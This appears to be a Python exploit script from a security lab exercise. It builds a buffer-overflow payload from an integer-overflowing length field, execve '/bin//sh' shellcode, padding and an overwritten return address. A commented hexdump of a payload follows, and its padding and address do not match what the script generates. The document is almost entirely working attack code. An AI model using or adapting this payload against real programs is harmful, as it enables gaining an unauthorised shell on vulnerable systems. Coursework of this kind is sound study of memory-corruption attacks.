from struct import pack
from shellcode import shellcode


addr = pack("<I", 0xbffeb860 - 0x6)

takeoff = pack("<I", 0x80000006)
offset = "E" * 0x45
print(takeoff + shellcode + offset + addr)

'''
ubuntu@ubuntu:~/mp1$ cat tmp | hd
00000000  06 00 00 80 6a 0b 58 99  52 68 2f 2f 73 68 68 2f  |....j.X.Rh//shh/|
00000010  62 69 6e 89 e3 52 53 89  e1 cd 80 41 41 41 41 41  |bin..RS....AAAAA|
00000020  41 41 41 41 41 41 41 41  41 41 41 41 41 41 41 41  |AAAAAAAAAAAAAAAA|
*
00000060  90 fc fe bf 0a                                    |.....|
'''